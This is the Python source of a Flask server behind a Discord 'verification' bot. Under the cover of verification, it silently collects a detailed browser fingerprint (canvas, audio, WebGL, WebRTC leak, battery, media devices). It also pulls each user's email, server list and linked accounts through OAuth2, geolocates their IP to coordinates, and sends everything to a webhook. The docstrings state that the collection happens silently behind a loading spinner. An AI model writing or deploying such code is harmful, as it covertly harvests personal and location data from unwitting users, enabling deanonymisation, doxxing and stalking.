"""
app.py — Flask web server.

Flow:
  1. Bot button  →  /start?state=TOKEN
  2. /start page silently collects browser fingerprint via JS,
     POSTs it to /save-fp (stored server-side by state token),
     then auto-redirects to Discord OAuth2 (same state token).
  3. Discord  →  /callback?code=...&state=TOKEN
  4. /callback exchanges code, fetches Discord data, looks up
     fingerprint by state, sends webhook, assigns role.
"""

from __future__ import annotations

import asyncio
import re
import time
import urllib.parse
from datetime import datetime

import requests
from flask import Flask, jsonify, redirect, render_template, request

from config import (
    APP_BASE_URL, CLIENT_ID, CLIENT_SECRET,
    GUILD_ID, OAUTH2_SCOPES, REDIRECT_URI, SECRET_KEY, WEBHOOK_URL,
)

app = Flask(__name__)
app.secret_key = SECRET_KEY

# Injected by main.py after the event loop is created
discord_bot  = None
bot_loop: asyncio.AbstractEventLoop | None = None

DISCORD_API = "https://discord.com/api/v10"

# ── Server-side fingerprint store (keyed by OAuth2 state token) ───────────────
fp_store:      dict[str, dict]  = {}
fp_timestamps: dict[str, float] = {}
_FP_TTL = 600  # 10 minutes


def _cleanup():
    now = time.time()
    for k in [k for k, t in fp_timestamps.items() if now - t > _FP_TTL]:
        fp_store.pop(k, None)
        fp_timestamps.pop(k, None)


# ─── Utility helpers ──────────────────────────────────────────────────────────

def get_real_ip() -> str:
    for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        v = request.headers.get(h, "").split(",")[0].strip()
        if v:
            return v
    return request.remote_addr or "Unknown"


def country_flag(code: str) -> str:
    if not code or len(code) != 2:
        return ""
    return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)


def get_ip_info(ip: str) -> dict:
    if ip in ("127.0.0.1", "::1", "localhost", "Unknown"):
        return {}
    try:
        fields = (
            "status,country,countryCode,regionName,city,"
            "zip,lat,lon,timezone,offset,isp,org,as,proxy,hosting"
        )
        r = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=5)
        d = r.json()
        return d if d.get("status") == "success" else {}
    except Exception:
        return {}


def fmt_snowflake(snowflake_id: int) -> str:
    """Snowflake → 'January 10, 2026 at 6:04 PM UTC'"""
    if not snowflake_id:
        return "Unknown"
    ts = ((snowflake_id >> 22) + 1420070400000) / 1000
    dt = datetime.utcfromtimestamp(ts)
    h  = int(dt.strftime("%I"))   # no leading zero
    return f"{dt.strftime('%B')} {dt.day}, {dt.year} at {h}:{dt.strftime('%M %p')} UTC"


def fmt_now() -> str:
    dt = datetime.utcnow()
    h  = int(dt.strftime("%I"))
    return f"{dt.strftime('%B')} {dt.day}, {dt.year} at {h}:{dt.strftime('%M %p')} UTC"


def parse_flags(flags: int) -> list[str]:
    badge_map = {
        1:       "Discord Staff",
        2:       "Partnered Server Owner",
        4:       "HypeSquad Events",
        8:       "Bug Hunter Lv.1",
        64:      "HypeSquad Bravery",
        128:     "HypeSquad Brilliance",
        256:     "HypeSquad Balance",
        512:     "Early Supporter",
        16384:   "Bug Hunter Lv.2",
        131072:  "Verified Bot Developer",
        4194304: "Active Developer",
    }
    return [name for bit, name in badge_map.items() if flags & bit]


def nitro_label(t: int) -> str:
    return {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(t, "None")


def parse_ua(ua: str) -> tuple[str, str]:
    """Returns (browser string, OS string) parsed from User-Agent."""
    browser, os_name = "Unknown", "Unknown"

    for pattern, name in [
        (r"Edg/(\d+)",           "Edge {}"),
        (r"OPR/(\d+)",           "Opera {}"),
        (r"YaBrowser/(\d+)",     "Yandex {}"),
        (r"SamsungBrowser/(\d+)","Samsung Browser {}"),
        (r"Firefox/(\d+)",       "Firefox {}"),
        (r"Chrome/(\d+)",        "Chrome {}"),
    ]:
        m = re.search(pattern, ua)
        if m:
            browser = name.format(m.group(1))
            break
    else:
        m = re.search(r"Version/(\d+).*Safari", ua)
        if m:
            browser = f"Safari {m.group(1)}"

    if   "Windows NT 10.0" in ua: os_name = "Windows 10/11"
    elif "Windows NT 6.3"  in ua: os_name = "Windows 8.1"
    elif "Windows NT 6.1"  in ua: os_name = "Windows 7"
    elif "Windows"         in ua: os_name = "Windows"
    elif "Macintosh"       in ua:
        m = re.search(r"Mac OS X ([\d_]+)", ua)
        os_name = f"macOS {m.group(1).replace('_','.')}" if m else "macOS"
    elif "CrOS"            in ua: os_name = "ChromeOS"
    elif "Android"         in ua:
        m = re.search(r"Android ([\d.]+)", ua)
        os_name = f"Android {m.group(1)}" if m else "Android"
    elif "iPhone"          in ua: os_name = "iOS (iPhone)"
    elif "iPad"            in ua: os_name = "iOS (iPad)"
    elif "Linux"           in ua: os_name = "Linux"

    return browser, os_name


# ─── Discord OAuth2 ───────────────────────────────────────────────────────────

def build_discord_oauth_url(state: str) -> str:
    params = urllib.parse.urlencode({
        "client_id":     CLIENT_ID,
        "redirect_uri":  REDIRECT_URI,
        "response_type": "code",
        "scope":         OAUTH2_SCOPES,
        "state":         state,
        "prompt":        "consent",
    })
    return f"https://discord.com/api/oauth2/authorize?{params}"


def exchange_code(code: str) -> dict:
    resp = requests.post(
        f"{DISCORD_API}/oauth2/token",
        data={
            "client_id":     CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type":    "authorization_code",
            "code":          code,
            "redirect_uri":  REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp.raise_for_status()
    return resp.json()


def fetch_discord_data(token: str) -> dict:
    h    = {"Authorization": f"Bearer {token}"}
    user = requests.get(f"{DISCORD_API}/users/@me",            headers=h).json()
    g    = requests.get(f"{DISCORD_API}/users/@me/guilds",     headers=h).json()
    c    = requests.get(f"{DISCORD_API}/users/@me/connections", headers=h).json()
    return {
        "user":        user,
        "guilds":      g if isinstance(g, list) else [],
        "connections": c if isinstance(c, list) else [],
    }


# ─── Embed builder ────────────────────────────────────────────────────────────

def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[dict]:
    user        = discord_data["user"]
    guilds      = discord_data["guilds"]
    connections = discord_data["connections"]

    uid     = int(user.get("id", 0))
    uname   = user.get("username", "Unknown")
    discrim = user.get("discriminator", "0")
    email   = user.get("email", "Not provided")
    av_hash = user.get("avatar", "")
    av_url  = (
        f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.png?size=256"
        if av_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
    )
    email_ok = user.get("verified",    False)
    mfa      = user.get("mfa_enabled", False)
    locale   = user.get("locale",      "Unknown")
    nitro    = nitro_label(user.get("premium_type", 0))
    badges   = parse_flags(user.get("public_flags", 0))
    created  = fmt_snowflake(uid)

    is_vpn = bool(ip_info.get("proxy") or ip_info.get("hosting"))
    flag   = country_flag(ip_info.get("countryCode", ""))
    color  = 0xED4245 if is_vpn else 0x57F287

    # UA parsing with JS fingerprint fallback
    ua_raw           = fp.get("userAgent") or request.headers.get("User-Agent", "Unknown")
    browser, os_name = parse_ua(ua_raw)

    # All device fields — JS fingerprint values, with readable fallbacks
    def fp_val(key, fallback="N/A"):
        v = fp.get(key)
        return str(v) if v not in (None, "", "N/A") else fallback

    lang       = fp_val("language",  request.headers.get("Accept-Language","?").split(",")[0])
    languages  = fp_val("languages")
    platform   = fp_val("platform",  os_name)
    screen     = fp_val("screen")
    dpr        = fp_val("devicePixelRatio")
    window_sz  = fp_val("windowSize")
    avail_s    = fp_val("availScreen")
    color_d    = fp_val("colorDepth")
    tz_fp      = fp_val("timezone")
    cpu        = fp_val("hardwareConcurrency")
    mem        = fp_val("deviceMemory")
    touch      = fp_val("maxTouchPoints", "0")
    webgl      = fp_val("webGL")
    webgl_v    = fp_val("webGLVendor")
    canvas_h   = fp_val("canvasHash")
    audio_fp   = fp_val("audioFingerprint")
    dnt        = fp_val("doNotTrack")
    cookies    = fp.get("cookieEnabled")
    adblock    = fp.get("adBlock", False)
    webrtc     = fp_val("webRTC")
    connection = fp_val("connection")
    battery    = fp_val("battery")
    plugins    = fp_val("plugins")
    a_in       = fp_val("audioInputs")
    a_out      = fp_val("audioOutputs")
    v_in       = fp_val("videoInputs")

    # ── Discord Account field ─────────────────────────────────────────────────
    discrim_str = f"#{discrim}" if discrim not in ("0", "", None) else ""
    badge_str   = ",  ".join(f"`{b}`" for b in badges) if badges else "None"

    account_val = (
        f"**{uname}{discrim_str}** — `{uid}`\n"
        f"📧  {email}  {'✅' if email_ok else '❌'}\n"
        f"📅  {created}\n"
        f"🔐  2FA: {'✅ On' if mfa else '❌ Off'}  •  Nitro: **{nitro}**  •  Locale: `{locale}`\n"
        f"🏅  Badges: {badge_str}"
    )

    # ── Network field ─────────────────────────────────────────────────────────
    tz_offset = ip_info.get("offset", 0)
    tz_sign   = "+" if tz_offset >= 0 else ""
    tz_hours  = tz_offset // 3600 if isinstance(tz_offset, int) else "?"
    lat       = ip_info.get("lat", "?")
    lon       = ip_info.get("lon", "?")

    network_val = (
        f"🌐  `{ip}`\n"
        f"{flag}  **{ip_info.get('country','Unknown')}** — "
        f"{ip_info.get('city','?')}, {ip_info.get('regionName','?')}\n"
        f"🏢  {ip_info.get('isp','Unknown')}\n"
        f"🔢  {ip_info.get('as','N/A')}\n"
        f"🕐  {ip_info.get('timezone','N/A')} (UTC{tz_sign}{tz_hours})\n"
        f"📍  {lat}°,  {lon}°\n"
        f"🔒  VPN/Proxy: {'⚠️ **YES**' if is_vpn else '✅ No'}  •  "
        f"Datacenter: {'⚠️ **YES**' if ip_info.get('hosting') else '✅ No'}"
    )

    # ── Device / Browser field ────────────────────────────────────────────────
    device_val = (
        f"🌐  **{browser}**\n"
        f"🖥️  **{os_name}**  (`{platform}`)\n"
        f"🌍  {lang}  •  All: {languages}\n"
        f"📺  {screen} @ {dpr}×  •  Window: {window_sz}\n"
        f"🖥️  Available: {avail_s}  •  {color_d}\n"
        f"🕐  TZ: {tz_fp}\n"
        f"⚡  CPU: **{cpu}** cores  •  RAM: **{mem}** GB\n"
        f"👆  Touch points: {touch}\n"
        f"🎮  GPU: {webgl}\n"
        f"🏭  GPU Vendor: {webgl_v}\n"
        f"🖼️  Canvas hash: `{canvas_h}`\n"
        f"🎵  Audio FP: `{audio_fp}`\n"
        f"📡  WebRTC leak: `{webrtc}`\n"
        f"📶  Connection: {connection}\n"
        f"🔋  Battery: {battery}\n"
        f"🔇  AdBlock: {'✅ Yes' if adblock else '❌ No'}  •  "
        f"DNT: {dnt}  •  Cookies: {'✅' if cookies else '❌'}\n"
        f"🎙️  Mic: {a_in}  •  Cam: {v_in}  •  Speakers: {a_out}\n"
        f"🧩  Plugins: {plugins}"
    )

    vpn_header = "⚠️  VPN / PROXY DETECTED  •  " if is_vpn else ""
    now_iso    = datetime.utcnow().isoformat() + "Z"

    embed1 = {
        "title":       f"{vpn_header}🔐  New Verification",
        "description": f"<@{uid}> just verified in the server.",
        "color":       color,
        "thumbnail":   {"url": av_url},
        "fields": [
            {"name": "👤  Discord Account",   "value": account_val[:1024], "inline": False},
            {"name": "🌍  Network & Location", "value": network_val[:1024], "inline": True},
            {"name": "💻  Device & Browser",   "value": device_val[:1024],  "inline": True},
        ],
        "footer":    {"text": f"Verified at {fmt_now()}"},
        "timestamp": now_iso,
    }

    # ── Servers ───────────────────────────────────────────────────────────────
    guild_lines = []
    for g in guilds[:25]:
        crown = " 👑" if g.get("owner") else ""
        guild_lines.append(f"• **{g.get('name','?')}**{crown}  `{g.get('id','')}`")
    if len(guilds) > 25:
        guild_lines.append(f"*…and {len(guilds) - 25} more*")
    guilds_val = "\n".join(guild_lines) or "None visible"

    # ── Connected accounts ────────────────────────────────────────────────────
    icons = {
        "twitch": "🟣", "youtube": "🔴", "steam": "🖥️",
        "spotify": "🟢", "twitter": "🐦", "github": "⬛",
        "xbox": "🟩", "facebook": "🔵", "reddit": "🟠",
        "playstation": "🔵", "epicgames": "⬜", "instagram": "🟤",
        "tiktok": "⬛", "riotgames": "🔴", "leagueoflegends": "🔷",
    }
    conn_lines = []
    for c in connections:
        ctype  = c.get("type", "?")
        icon   = icons.get(ctype, "🔗")
        veri   = " ✅" if c.get("verified") else ""
        hidden = " 🔒" if not c.get("visibility") else ""
        conn_lines.append(f"{icon}  **{ctype.title()}** — {c.get('name','?')}{veri}{hidden}")
    conns_val = "\n".join(conn_lines) or "None connected"

    embed2 = {
        "color": color,
        "fields": [
            {"name": f"🏠  Servers ({len(guilds)})",             "value": guilds_val[:1024], "inline": False},
            {"name": f"🔗  Connected Accounts ({len(connections)})", "value": conns_val[:1024],  "inline": False},
        ],
        "footer":    {"text": f"User ID: {uid}"},
        "timestamp": now_iso,
    }

    return [embed1, embed2]


def send_webhook(discord_data: dict, ip: str, ip_info: dict, fp: dict):
    if not WEBHOOK_URL:
        print("⚠️  WEBHOOK_URL not set — skipping")
        return
    try:
        embeds = build_embeds(discord_data, ip, ip_info, fp)
        r = requests.post(WEBHOOK_URL, json={"embeds": embeds}, timeout=8)
        r.raise_for_status()
        print(f"📨  Webhook sent  HTTP {r.status_code}")
    except Exception as e:
        print(f"❌  Webhook error: {e}")


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/start")
def start():
    """
    User arrives here from the Discord bot button with ?state=TOKEN.
    Renders a silent auto-collect page — collects fingerprint via JS,
    saves it server-side, then auto-redirects to Discord OAuth2.
    All of this happens in ~1.5 seconds with just a loading spinner shown.
    """
    state = request.args.get("state", "").strip()
    if not state:
        return render_template("error.html", error="Missing state token. Please click Verify Now again.")

    oauth_url = build_discord_oauth_url(state)
    return render_template("start.html", oauth_url=oauth_url, state=state)


@app.route("/save-fp", methods=["POST"])
def save_fp():
    """Receives browser fingerprint from the JS on /start and stores it by state token."""
    _cleanup()
    data  = request.get_json(silent=True) or {}
    state = data.get("state", "").strip()
    fp    = data.get("fp", {})
    if state:
        fp_store[state]      = fp
        fp_timestamps[state] = time.time()
        print(f"💾  Fingerprint saved for state …{state[-6:]}")
    return jsonify({"ok": True})


@app.route("/callback")
def callback():
    """Discord redirects here after the user authorizes. Processes everything."""
    code  = request.args.get("code", "")
    state = request.args.get("state", "")
    error = request.args.get("error", "")

    if error:
        return render_template("error.html", error=request.args.get("error_description", error))
    if not code:
        return render_template("error.html", error="No authorization code received from Discord.")

    # Retrieve and remove fingerprint from store
    fp = fp_store.pop(state, {})
    fp_timestamps.pop(state, None)

    # Always ensure UA is present from the callback request headers as a fallback
    if not fp.get("userAgent"):
        fp["userAgent"] = request.headers.get("User-Agent", "Unknown")

    try:
        # 1. Exchange code → access token
        token_data   = exchange_code(code)
        access_token = token_data["access_token"]

        # 2. Fetch all Discord data
        discord_data = fetch_discord_data(access_token)
        user         = discord_data["user"]
        uid          = int(user.get("id", 0))

        # 3. IP geolocation
        ip      = get_real_ip()
        ip_info = get_ip_info(ip)

        # 4. Send webhook
        send_webhook(discord_data, ip, ip_info, fp)

        # 5. Assign verified role via bot
        role_given = False
        if uid and discord_bot and bot_loop:
            future = asyncio.run_coroutine_threadsafe(
                discord_bot.give_verified_role(uid), bot_loop
            )
            try:
                role_given = future.result(timeout=10)
            except Exception as e:
                print(f"⚠️  Role error: {e}")

        return render_template(
            "success.html",
            username=user.get("username", "User"),
            role_given=role_given,
        )

    except requests.HTTPError as e:
        print(f"❌  HTTP error: {e}")
        return render_template("error.html", error="Failed to communicate with the Discord API.")
    except Exception:
        import traceback
        traceback.print_exc()
        return render_template("error.html", error="An unexpected error occurred.")
